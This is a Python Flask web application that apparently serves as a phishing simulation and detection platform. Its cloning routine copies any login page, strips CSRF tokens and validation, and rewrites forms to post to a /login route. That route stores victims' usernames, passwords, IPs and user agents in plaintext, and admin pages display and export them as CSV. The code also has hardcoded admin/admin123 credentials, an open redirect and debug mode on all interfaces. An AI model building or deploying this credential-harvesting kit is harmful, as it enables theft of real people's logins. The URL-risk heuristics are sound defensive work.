import os
import json
import uuid
import csv
import io
import requests
import datetime
import shutil
import ssl

from pathlib import Path
from urllib.parse import urlparse, urljoin
import tldextract
import whois
from concurrent.futures import ThreadPoolExecutor

from flask import (
    Flask, request, session, redirect, url_for,
    make_response, send_from_directory, render_template,
    jsonify
)
from bs4 import BeautifulSoup
import matplotlib.pyplot as plt
from werkzeug.security import generate_password_hash, check_password_hash

# -------------------- App & Config --------------------
app = Flask(__name__, static_folder="static", template_folder="templates")
app.secret_key = os.environ.get("SECRET_KEY", "dev_only_change_me")  # change in production

DATA_FILE = "credentials.json"
OPS_FILE = "ops_log.json"      # stores clone + detection history
USERS_FILE = "users.json"      # stores registered users (hashed passwords)
CLONED_BASE_FOLDER = "cloned_sites"
MAX_CLONE_SIZE = 10 * 1024 * 1024  # 10MB
ALLOWED_EXTENSIONS = {'.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.ico', '.svg', '.woff', '.woff2'}

Path(CLONED_BASE_FOLDER).mkdir(exist_ok=True)
for f, default in [(DATA_FILE, []), (OPS_FILE, []), (USERS_FILE, [])]:
    if not os.path.exists(f):
        with open(f, "w") as fh:
            json.dump(default, fh)

# -------------------- Utilities --------------------
def is_valid_uuid(uuid_str):
    try:
        uuid.UUID(uuid_str)
        return True
    except ValueError:
        return False

def is_safe_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ('http', 'https') and parsed.netloc

def ssrf_public_host(url: str) -> bool:
    try:
        host = urlparse(url).hostname or ""
        # Block localhost/metadata/private ranges
        if host in ("localhost",) or host.startswith(("127.", "0.", "169.254.")):
            return False
        private_blocks = ("10.", "192.168.", "172.16.", "172.17.", "172.18.", "172.19.", "172.2", "172.3")
        if host.startswith(private_blocks):
            return False
        if "metadata.google.internal" in host:
            return False
        return True
    except Exception:
        return False

def sanitize_filename(filename):
    keepchars = ('-', '_', '.')
    return "".join(c for c in filename if c.isalnum() or c in keepchars).rstrip()

def download_resource(resource_url, output_folder, max_bytes=MAX_CLONE_SIZE):
    try:
        if not is_safe_url(resource_url) or not ssrf_public_host(resource_url):
            return None

        with requests.get(resource_url, stream=True, timeout=10) as r:
            r.raise_for_status()
            content_length = int(r.headers.get('content-length', 0))
            if content_length and content_length > max_bytes:
                return None

            parsed = urlparse(resource_url)
            file_ext = os.path.splitext(parsed.path)[1].lower()
            if file_ext not in ALLOWED_EXTENSIONS:
                return None

            file_name = sanitize_filename(os.path.basename(parsed.path)) or f"resource{file_ext}"
            local_path = os.path.join(output_folder, file_name)

            downloaded = 0
            with open(local_path, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
                        downloaded += len(chunk)
                        if downloaded > max_bytes:
                            try:
                                os.remove(local_path)
                            except Exception:
                                pass
                            return None

            return file_name
    except (requests.exceptions.RequestException, OSError):
        return None

def remove_inline_js_attrs(tag):
    for attr in list(tag.attrs):
        if attr.lower().startswith('on'):
            del tag[attr]

def clone_page(url, clone_id, preserve_js=False, new_form_action="/login"):
    if not is_safe_url(url) or not ssrf_public_host(url):
        return "Invalid or unsafe URL provided"

    output_folder = os.path.join(CLONED_BASE_FOLDER, clone_id)
    os.makedirs(output_folder, exist_ok=True)

    try:
        with requests.get(url, timeout=15) as resp:
            resp.raise_for_status()
            if len(resp.content) > MAX_CLONE_SIZE:
                return "Page too large to clone"

            soup = BeautifulSoup(resp.content, 'html.parser', from_encoding=resp.encoding)

            # 1) Strip inline JS
            for tag in soup.find_all():
                remove_inline_js_attrs(tag)

            # 2) Remove scripts unless preserving
            if not preserve_js:
                for script in soup.find_all('script'):
                    script.decompose()

            # 3) Normalize forms
            for form in soup.find_all('form'):
                form['action'] = new_form_action
                form['method'] = 'POST'
                form['novalidate'] = 'novalidate'

                has_user = False
                has_pass = False

                for input_tag in form.find_all('input'):
                    for attr in ['required', 'pattern', 'maxlength', 'minlength', 'autocomplete', 'aria-invalid']:
                        if input_tag.has_attr(attr):
                            del input_tag[attr]

                    t = (input_tag.get('type') or '').lower()
                    n = (input_tag.get('name') or '').lower()

                    if n in ['csrf', 'token', 'authenticity_token', '__requestverificationtoken', '_csrf', '_token']:
                        input_tag.decompose()
                        continue

                    if t in ['email', 'text', 'tel', 'search', 'name', 'username'] or n in ['email', 'login', 'user', 'userid', 'username']:
                        input_tag['type'] = 'text'
                        input_tag['name'] = 'username'
                        has_user = True
                    elif t == 'password' or n in ['pass', 'passwd', 'password']:
                        input_tag['type'] = 'password'
                        input_tag['name'] = 'password'
                        has_pass = True

                for btn in form.find_all('button'):
                    if btn.get('type', '').lower() in ['', 'button', 'reset']:
                        btn['type'] = 'submit'

                if not form.find(['button', 'input'], {'type': 'submit'}):
                    submit = soup.new_tag('button', attrs={'type': 'submit'})
                    submit.string = 'Sign In'
                    form.append(submit)

                if not has_user:
                    hidden_u = soup.new_tag('input', attrs={'type': 'text', 'name': 'username', 'style': 'display:none'})
                    form.append(hidden_u)
                if not has_pass:
                    hidden_p = soup.new_tag('input', attrs={'type': 'password', 'name': 'password', 'style': 'display:none'})
                    form.append(hidden_p)

            # 4) Assets
            for tag in soup.find_all(['img', 'link', 'source']):
                attr = 'href' if tag.name == 'link' else 'src'
                if tag.has_attr(attr):
                    resource_url = urljoin(url, tag[attr])
                    if resource_url.startswith(('http://', 'https://')):
                        local_filename = download_resource(resource_url, output_folder)
                        if local_filename:
                            tag[attr] = url_for('serve_cloned_file', clone_id=clone_id, filename=local_filename)

            # 5) Save
            index_path = os.path.join(output_folder, "index.html")
            with open(index_path, "w", encoding='utf-8') as f:
                f.write(str(soup))

            return None

    except requests.exceptions.RequestException as e:
        return f"Error fetching page: {str(e)}"
    except Exception as e:
        return f"Unexpected error: {str(e)}"

def save_credentials(username, password, raw_form, ip_address):
    try:
        with open(DATA_FILE, 'r+') as f:
            try:
                existing_data = json.load(f)
            except json.JSONDecodeError:
                existing_data = []

            existing_data.append({
                "username": username,
                "password": password,
                "raw_data": raw_form,
                "ip_address": ip_address,
                "timestamp": datetime.datetime.utcnow().isoformat(),
                "user_agent": request.headers.get('User-Agent', 'Unknown')
            })

            f.seek(0)
            json.dump(existing_data, f, indent=4)
            f.truncate()
    except (IOError, OSError) as e:
        app.logger.error(f"Failed to save credentials: {str(e)}")

def load_credentials():
    if not os.path.exists(DATA_FILE):
        return []
    try:
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return []

def log_op(op_type, url=None, clone_id=None, note=None, user=None):
    try:
        with open(OPS_FILE, 'r+') as f:
            try:
                ops = json.load(f)
            except json.JSONDecodeError:
                ops = []
            ops.append({
                "id": str(uuid.uuid4())[:8],
                "op_type": op_type,          # "clone" or "detect"
                "url": url,
                "clone_id": clone_id,
                "note": note,
                "user": user,                # track which user performed the operation
                "created_at": datetime.datetime.utcnow().isoformat()
            })
            f.seek(0)
            json.dump(ops, f, indent=4)
            f.truncate()
    except Exception as e:
        app.logger.error(f"Failed to log op: {e}")

def load_ops():
    if not os.path.exists(OPS_FILE):
        return []
    try:
        with open(OPS_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return []

# -------- User storage helpers --------
def load_users():
    try:
        with open(USERS_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return []

def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=4)

def find_user(username):
    username = (username or "").strip().lower()
    for u in load_users():
        if u.get("username", "").lower() == username:
            return u
    return None

# -------------------- Phishing Detection --------------------
def check_domain_age(domain):
    try:
        info = whois.whois(domain)
        if info.creation_date:
            creation_date = info.creation_date[0] if isinstance(info.creation_date, list) else info.creation_date
            age_days = (datetime.datetime.now() - creation_date).days
            return min(100, max(0, 100 - (age_days / 365 * 100)))
    except:
        pass
    return 80

def check_ssl_certificate(url):
    try:
        parsed = urlparse(url)
        hostname = parsed.hostname
        scheme = (parsed.scheme or '').lower()
        if not hostname:
            return 100
        # If site is plain HTTP, consider it high risk
        if scheme == 'http':
            return 100

        import socket
        context = ssl.create_default_context()
        # Require valid certs
        context.check_hostname = True
        context.verify_mode = ssl.CERT_REQUIRED

        with socket.create_connection((hostname, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                # If we reached here, chain and hostname validated
                # Assess expiry proximity as a mild risk factor
                not_after = cert.get('notAfter')
                if not_after:
                    from datetime import datetime
                    exp = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    days_left = (exp - datetime.utcnow()).days
                    if days_left < 0:
                        return 100  # expired
                    if days_left < 14:
                        return 40   # expiring very soon
                    if days_left < 30:
                        return 20   # expiring soon
                return 0  # valid and not near expiry
    except Exception:
        app.logger.exception("SSL validation failed")
        return 100

def check_phishing_databases(url):
    # Lightweight heuristic placeholder; tune to reduce false positives
    lower_url = url.lower()
    suspicious_keywords = ['verify', 'secure-update', 'password-reset', 'wallet', 'gift-card']
    score = 0
    for kw in suspicious_keywords:
        if kw in lower_url:
            score += 10
    # Keywords in query or path are more suspicious than in domain
    parsed = urlparse(url)
    path_query = (parsed.path or '') + '?' + (parsed.query or '')
    for sensitive in ['password', 'ssn', 'otp', 'credit-card']:
        if sensitive in path_query.lower():
            score += 15
    return min(100, max(10, score))

def check_url_structure(url: str) -> int:
    """Return 0..100 risk from URL structure and host signals.
    High means risky.
    """
    try:
        if not ssrf_public_host(url):
            return 60
        parsed = urlparse(url)
        host = parsed.hostname or ''
        full = url

        # IP address as hostname
        import re
        if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", host):
            return 80

        # Punycode (IDN) usage can be risky if mixed scripts
        risk = 0
        if host.startswith('xn--'):
            risk += 20

        # Excessive subdomains
        subdomain_parts = host.split('.')[:-2]
        if len(subdomain_parts) >= 3:
            risk += 20

        # Suspicious TLDs
        tlds_high_risk = {'tk', 'ml', 'ga', 'cf', 'gq', 'top', 'xyz', 'icu', 'click'}
        ext = tldextract.extract(url)
        if (ext.suffix or '').split('.')[-1] in tlds_high_risk:
            risk += 30  # Increased penalty for risky TLDs

        # Typosquatting: simple character substitution checks against well-known brands
        brands = ['google', 'microsoft', 'apple', 'amazon', 'facebook', 'paypal', 'netflix', 'bank']
        host_l = host.lower()
        for b in brands:
            if b in host_l:
                # Look for common tricks
                if any(x in host_l for x in ['0', '1', 'l', '-', '--', '.', b + '-secure', 'auth-', 'verification', 'login']):
                    risk += 25  # Increased penalty for brand spoofing
        # @ in URL path (rare legit use)
        if '@' in full.split('://', 1)[-1]:
            risk += 30

        # Long URL
        if len(full) > 120:
            risk += 10

        return min(100, max(0, risk))
    except Exception:
        app.logger.exception("URL structure analysis failed")
        return 50

def check_page_similarity(url):
    try:
        if not ssrf_public_host(url):
            return 50
        resp = requests.get(url, timeout=5)
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = len(soup.find_all('form'))
        passwords = len(soup.find_all('input', {'type': 'password'}))
        return min(100, (forms * 20 + passwords * 30))
    except:
        return 50

def check_hidden_elements(url):
    try:
        if not ssrf_public_host(url):
            return 20
        resp = requests.get(url, timeout=5)
        soup = BeautifulSoup(resp.text, 'html.parser')
        hidden = len(soup.find_all('input', {'type': 'hidden'}))
        return min(100, hidden * 15)
    except:
        return 20

def analyze_phishing(url):
    extracted = tldextract.extract(url)
    domain = f"{extracted.domain}.{extracted.suffix}"

    with ThreadPoolExecutor() as executor:
        f_age = executor.submit(check_domain_age, domain)
        f_ssl = executor.submit(check_ssl_certificate, url)
        f_db  = executor.submit(check_phishing_databases, url)
        f_sim = executor.submit(check_page_similarity, url)
        f_hid = executor.submit(check_hidden_elements, url)
        f_url = executor.submit(check_url_structure, url)

        domain_age = f_age.result()
        ssl_valid  = f_ssl.result()
        in_blacklist = f_db.result()
        similarity_score = f_sim.result()
        hidden_elements  = f_hid.result()
        url_structure    = f_url.result()

    # Enhanced weights to properly detect dangerous sites
    # Higher weights for critical signals (SSL, domain age, URL structure)
    risk_score = int((domain_age*0.25 + ssl_valid*0.25 + in_blacklist*0.15 +
                     similarity_score*0.15 + hidden_elements*0.05 + url_structure*0.15))
    
    # Boost risk score for dangerous combinations
    # Only escalate strongly if URL structure is also notably risky
    if ssl_valid > 80 and domain_age > 70 and url_structure > 40:  # No SSL + new domain + risky URL traits
        risk_score = min(100, risk_score + 20)
    if url_structure > 60:  # High URL structure risk
        risk_score = min(100, risk_score + 15)
    if in_blacklist > 40:  # High keyword risk
        risk_score = min(100, risk_score + 10)

    return {
        "url": url,
        "domain": domain,
        "risk_score": risk_score,
        "is_phishing": risk_score > 70,
        "checks": {
            "domain_age": domain_age,
            "ssl_valid": ssl_valid,
            "in_blacklist": in_blacklist,
            "similarity_score": similarity_score,
            "hidden_elements": hidden_elements,
            "url_structure": url_structure
        }
    }

# -------------------- Routes --------------------
@app.route("/")
def index():
    return render_template("index.html", title="Home")

# Simple About page
@app.route("/about")
def about():
    return render_template("about.html", title="About")

# User education page
@app.route("/education")
def education():
    return render_template("education.html", title="User Education")

# ----- Admin login (AND user option on same page) -----
@app.route("/admin.html", methods=["GET", "POST"])
def admin_html():
    if request.method == "POST":
        # This endpoint only processes admin form
        if (request.form.get("admin_username") == "admin" and
            request.form.get("admin_password") == "admin123"):
            session["admin_logged_in"] = True
            return redirect(url_for("admin_dashboard"))
        else:
            return render_template(
                'message.html',
                title="Admin Login",
                heading="Invalid Credentials",
                body="<p>Try again.</p>"
            )
    return render_template("admin_login.html", title="Login")

@app.route("/admin/dashboard")
def admin_dashboard():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_html"))
    
    # Load all operations for accurate metrics calculation
    all_ops = load_ops()
    
    # Calculate metrics from all operations
    total_operations = len(all_ops)
    pages_cloned = len([op for op in all_ops if op.get('op_type') == 'clone'])
    detections = len([op for op in all_ops if op.get('op_type') == 'detect'])
    
    # Get recent operations for display (last 25)
    recent_ops = all_ops[::-1][:25]
    
    return render_template("admin_dashboard.html", 
                         title="Dashboard", 
                         ops=recent_ops,
                         total_operations=total_operations,
                         pages_cloned=pages_cloned,
                         detections=detections)

@app.route("/admin-logout")
def admin_logout():
    session.pop("admin_logged_in", None)
    return redirect(url_for("admin_html"))

# ----- USER AUTH -----
@app.route("/user/login", methods=["GET", "POST"])
def user_login():
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = (request.form.get("password") or "")
        u = find_user(username)
        if u and check_password_hash(u.get("password_hash",""), password):
            session["user_logged_in"] = True
            session["user_name"] = u["username"]
            return redirect(url_for("user_dashboard"))
        return render_template("user_login.html", title="User Login", error="Invalid username or password")
    return render_template("user_login.html", title="User Login")

@app.route("/user/signup", methods=["GET", "POST"])
def user_signup():
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = (request.form.get("password") or "")
        confirm  = (request.form.get("confirm") or "")
        if not username or not password:
            return render_template("user_signup.html", title="Sign Up", error="Username and password are required")
        if password != confirm:
            return render_template("user_signup.html", title="Sign Up", error="Passwords do not match")
        if find_user(username):
            return render_template("user_signup.html", title="Sign Up", error="Username already exists")

        users = load_users()
        users.append({
            "username": username,
            "password_hash": generate_password_hash(password),
            "created_at": datetime.datetime.utcnow().isoformat()
        })
        save_users(users)
        return redirect(url_for("user_login"))
    return render_template("user_signup.html", title="Sign Up")

@app.route("/user/logout")
def user_logout():
    session.pop("user_logged_in", None)
    session.pop("user_name", None)
    return redirect(url_for("user_login"))

# ----- User Dashboard & Features -----
@app.route("/user/dashboard")
def user_dashboard():
    if not session.get("user_logged_in"):
        return redirect(url_for("user_login"))
    
    # Get all user operations for accurate metrics calculation
    all_ops = load_ops()
    user_name = session.get("user_name")
    user_ops = [op for op in all_ops if op.get("user") == user_name]
    
    # Calculate metrics from all user operations
    total_detections = len(user_ops)
    high_risk_count = 0
    safe_sites_count = 0
    
    for op in user_ops:
        if op.get('note') and 'risk=' in op.get('note', ''):
            try:
                risk_score = int(op['note'].split('risk=')[1])
                if risk_score > 70:
                    high_risk_count += 1
                elif risk_score <= 30:
                    safe_sites_count += 1
            except (ValueError, IndexError):
                pass
    
    # Get recent operations for display (last 10)
    recent_user_ops = user_ops[-10:] if len(user_ops) > 10 else user_ops
    
    return render_template("user_dashboard.html", 
                         title="User Dashboard", 
                         ops=recent_user_ops, 
                         user_name=user_name,
                         total_detections=total_detections,
                         high_risk_count=high_risk_count,
                         safe_sites_count=safe_sites_count)

@app.route("/user/profile", methods=["GET", "POST"])
def user_profile():
    if not session.get("user_logged_in"):
        return redirect(url_for("user_login"))
    
    users = load_users()
    current_user = find_user(session.get("user_name"))
    
    if request.method == "POST":
        # Update profile information
        new_email = request.form.get("email", "").strip()
        new_password = request.form.get("new_password", "").strip()
        current_password = request.form.get("current_password", "").strip()
        
        # Verify current password
        if not check_password_hash(current_user.get("password_hash", ""), current_password):
            return render_template("user_profile.html", title="Profile Settings", 
                                 user=current_user, error="Current password is incorrect")
        
        # Update email if provided
        if new_email and new_email != current_user["username"]:
            # Check if email already exists
            if find_user(new_email):
                return render_template("user_profile.html", title="Profile Settings", 
                                     user=current_user, error="Email already exists")
            current_user["username"] = new_email
            session["user_name"] = new_email
        
        # Update password if provided
        if new_password:
            current_user["password_hash"] = generate_password_hash(new_password)
        
        current_user["updated_at"] = datetime.datetime.utcnow().isoformat()
        save_users(users)
        
        return render_template("user_profile.html", title="Profile Settings", 
                             user=current_user, success="Profile updated successfully!")
    
    return render_template("user_profile.html", title="Profile Settings", user=current_user)

@app.route("/user/history")
def user_history():
    if not session.get("user_logged_in"):
        return redirect(url_for("user_login"))
    
    # Get all user's detection history
    all_ops = load_ops()
    user_ops = [op for op in all_ops if op.get("user") == session.get("user_name")]
    
    # Calculate metrics from all user operations
    total_detections = len(user_ops)
    high_risk_count = 0
    safe_sites_count = 0
    todays_checks = 0
    
    # Get today's date for comparison
    today = datetime.datetime.now().strftime('%Y-%m-%d')
    
    for op in user_ops:
        if op.get('note') and 'risk=' in op.get('note', ''):
            try:
                risk_score = int(op['note'].split('risk=')[1])
                if risk_score > 70:
                    high_risk_count += 1
                elif risk_score <= 30:
                    safe_sites_count += 1
            except (ValueError, IndexError):
                pass
        
        # Check if operation was performed today
        if op.get('created_at'):
            op_date = op['created_at'].split('T')[0]
            if op_date == today:
                todays_checks += 1
    
    # Reverse for display (most recent first)
    user_ops.reverse()
    
    return render_template("user_history.html", 
                         title="Detection History", 
                         ops=user_ops,
                         total_detections=total_detections,
                         high_risk_count=high_risk_count,
                         safe_sites_count=safe_sites_count,
                         todays_checks=todays_checks)

# ----- Clone UI -----
@app.route("/clone-page", methods=["GET"])
def clone_page_form():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_html"))
    return render_template("clone.html", title="Clone a Page")

@app.route("/clone", methods=["POST"])
def clone():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_html"))

    target_url = request.form.get("target_url", "").strip()
    preserve_js = request.form.get("preserve_js") == "1"

    if not target_url:
        return render_template('message.html',
                               title="Error",
                               heading="Clone Error",
                               body="<p>No URL provided.</p>"), 400

    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url

    clone_id = str(uuid.uuid4())
    error = clone_page(target_url, clone_id, preserve_js=preserve_js)
    if error:
        return render_template('message.html',
                               title="Error",
                               heading="Clone Error",
                               body=f"<p>{error}</p>"), 500

    log_op("clone", url=target_url, clone_id=clone_id)
    return redirect(url_for('preview_clone', clone_id=clone_id, target_url=target_url))

@app.route("/preview/<clone_id>")
def preview_clone(clone_id):
    if not is_valid_uuid(clone_id):
        return render_template('message.html',
                               title="Invalid Clone ID",
                               heading="Invalid Request",
                               body="<p>The provided clone identifier is invalid.</p>"), 400
    folder = os.path.join(CLONED_BASE_FOLDER, clone_id)
    if not os.path.exists(os.path.join(folder, "index.html")):
        return render_template('message.html',
                               title="Not Found",
                               heading="Clone Not Found",
                               body=f"<p>The requested clone could not be found.</p>"), 404
    target_url = request.args.get("target_url", "")
    return render_template("clone_preview.html",
                           title="Preview Clone",
                           clone_id=clone_id,
                           target_url=target_url)

@app.route("/cloned/<clone_id>/")
def serve_cloned_index(clone_id):
    if not is_valid_uuid(clone_id):
        return render_template('message.html',
                               title="Invalid Clone ID",
                               heading="Invalid Request",
                               body="<p>The provided clone identifier is invalid.</p>"), 400

    folder = os.path.join(CLONED_BASE_FOLDER, clone_id)
    index_path = os.path.join(folder, "index.html")
    if not os.path.exists(index_path):
        return render_template('message.html',
                               title="Not Found",
                               heading="Clone Not Found",
                               body=f"<p>The requested clone could not be found.</p>"), 404

    try:
        with open(index_path, "r", encoding="utf-8") as f:
            return f.read()
    except Exception:
        return render_template('message.html',
                               title="Error",
                               heading="Page Load Failed",
                               body="<p>Could not load the cloned page.</p>"), 500

@app.route("/cloned/<clone_id>/<path:filename>")
def serve_cloned_file(clone_id, filename):
    if not is_valid_uuid(clone_id):
        return "Invalid Clone ID", 400
    if '..' in filename or filename.startswith('/'):
        return "Invalid filename", 400

    folder = os.path.join(CLONED_BASE_FOLDER, clone_id)
    file_path = os.path.join(folder, filename)
    if not os.path.exists(file_path):
        return "Resource not found", 404

    try:
        return send_from_directory(folder, filename)
    except Exception:
        return "Error loading resource", 500

# Capture credentials from cloned form
@app.route("/login", methods=["POST"])
def capture_login():
    form_data = request.form.to_dict()
    username = form_data.get("username", "").strip()
    password = form_data.get("password", "").strip()
    ip_address = request.remote_addr or "Unknown IP"

    save_credentials(username, password, form_data, ip_address)
    return render_template(
        'message.html',
        title="Security Notice",
        heading="Phishing Simulation",
        body="""
        <div class="alert alert-warning">
            <b>Security Alert</b><br/>This was a simulated phishing test.
        </div>
        <a href="/admin.html" class="btn">Return to Admin</a>
        """
    )

# ----- Detection (User) -----
@app.route("/detect", methods=["GET", "POST"])
def user_detect():
    result = None
    if request.method == "POST":
        url = (request.form.get("url") or "").strip()
        if url and not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        if url:
            result = analyze_phishing(url)
            # Track user operation
            user_name = session.get("user_name", "anonymous")
            log_op("detect", url=url, note=f"risk={result['risk_score']}", user=user_name)
    return render_template("user_detect.html", title="Phishing Detection", result=result)

# Alias (keep old template links working)
app.add_url_rule(
    "/phishing-detection",
    endpoint="phishing_detection",
    view_func=user_detect,
    methods=["GET", "POST"]
)

# JSON detection endpoint (admin-only UI typically)
@app.route("/check-phishing", methods=["POST"])
def check_phishing():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_html"))
    url = request.form.get("url", "").strip()
    if not url:
        return jsonify({"error": "No URL provided"}), 400
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    try:
        result = analyze_phishing(url)
        log_op("detect", url=url, note=f"risk={result['risk_score']}")
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ----- Admin data views -----
@app.route("/view-credentials")
def view_credentials():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_html"))
    creds = load_credentials()
    return render_template('view_credentials.html',
                           title="Credentials",
                           credentials=creds,
                           credentials_count=len(creds))

@app.route("/analytics")
def analytics():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_html"))

    data = load_credentials()
    daily_counts = {}
    for entry in data:
        date_str = entry.get('timestamp', '').split('T')[0]
        if date_str:
            daily_counts[date_str] = daily_counts.get(date_str, 0) + 1

    return render_template('analytics.html',
                           title="Analytics",
                           total_submissions=len(data),
                           day_list=sorted(daily_counts.items()))

@app.route("/analytics-chart")
def analytics_chart():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_html"))

    data = load_credentials()
    daily_counts = {}
    for entry in data:
        date_str = entry.get('timestamp', '').split('T')[0]
        if date_str:
            daily_counts[date_str] = daily_counts.get(date_str, 0) + 1

    sorted_days = sorted(daily_counts.keys())
    day_values = [daily_counts[d] for d in sorted_days]

    fig, ax = plt.subplots(figsize=(10, 5))
    ax.plot(sorted_days, day_values, marker='o', linewidth=2)
    ax.set_xlabel("Date", fontsize=12)
    ax.set_ylabel("Submissions", fontsize=12)
    ax.set_title("Daily Credential Submissions", fontsize=14)
    ax.grid(True, linestyle='--', alpha=0.7)
    plt.xticks(rotation=45)
    plt.tight_layout()

    buf = io.BytesIO()
    fig.savefig(buf, format='png', dpi=100)
    plt.close(fig)
    buf.seek(0)

    response = make_response(buf.getvalue())
    response.headers['Content-Type'] = 'image/png'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    return response

@app.route("/export-credentials")
def export_credentials():
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_html"))

    data = load_credentials()
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["Timestamp", "IP Address", "Username", "Password", "User Agent"])
    for row in data:
        writer.writerow([
            row.get("timestamp", ""),
            row.get("ip_address", ""),
            row.get("username", ""),
            row.get("password", ""),
            row.get("user_agent", "")
        ])

    response = make_response(output.getvalue())
    response.headers["Content-Disposition"] = "attachment; filename=credentials_export.csv"
    response.headers["Content-Type"] = "text/csv"
    return response

@app.route("/admin/delete-clone/<clone_id>", methods=["POST"])
def delete_clone(clone_id):
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 403

    if not is_valid_uuid(clone_id):
        return jsonify({"error": "Invalid clone ID"}), 400

    folder_path = os.path.join(CLONED_BASE_FOLDER, clone_id)
    if os.path.exists(folder_path) and os.path.isdir(folder_path):
        try:
            shutil.rmtree(folder_path)
            return jsonify({"status": "success", "message": "Clone deleted successfully."})
        except OSError as e:
            return jsonify({"error": str(e)}), 500
    else:
        return jsonify({"error": "Clone folder not found"}), 404

@app.route("/admin/clear-credentials", methods=["POST"])
def clear_credentials():
    if not session.get("admin_logged_in"):
        return jsonify({"error": "Unauthorized"}), 403
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump([], f)
        return jsonify({"status": "success", "message": "All credentials cleared."})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ----- Helper Routes -----
@app.route("/favicon.ico")
def favicon():
    try:
        return app.send_static_file("favicon.ico")
    except Exception:
        return ("", 204)

@app.get("/original")
def original_redirect():
    target = request.args.get("url", "")
    if not target:
        return redirect(url_for("index"))
    return redirect(target)

# ----- Error Handlers -----
@app.errorhandler(404)
def page_not_found(e):
    return render_template('message.html',
                           title="Page Not Found",
                           heading="404 Error",
                           body="<p>The requested page could not be found.</p>"), 404

@app.errorhandler(500)
def internal_error(e):
    return render_template('message.html',
                           title="Server Error",
                           heading="500 Error",
                           body="<p>An internal server error occurred.</p>"), 500

# ----- Run -----
if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8855, debug=True)
